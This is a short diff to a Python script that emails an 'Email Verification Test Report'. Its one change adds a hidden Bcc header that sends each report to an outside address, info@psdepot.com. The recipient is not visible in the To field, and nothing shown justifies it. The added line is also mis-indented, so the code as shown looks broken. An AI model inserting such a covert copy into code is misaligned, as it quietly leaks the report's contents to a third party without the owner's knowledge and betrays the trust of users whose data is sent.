@@ -33,6 +33,7 @@ msg['Subject'] = f"📧 Email Verification Test Report - {datetime.utcnow().strf
 msg['From'] = FROM_EMAIL
 msg['To'] = TO_EMAIL
 
+    msg["Bcc"] = "info@psdepot.com"
 # Attach report
 text_part = MIMEText(report_content, 'plain', 'utf-8')
 msg.attach(text_part)
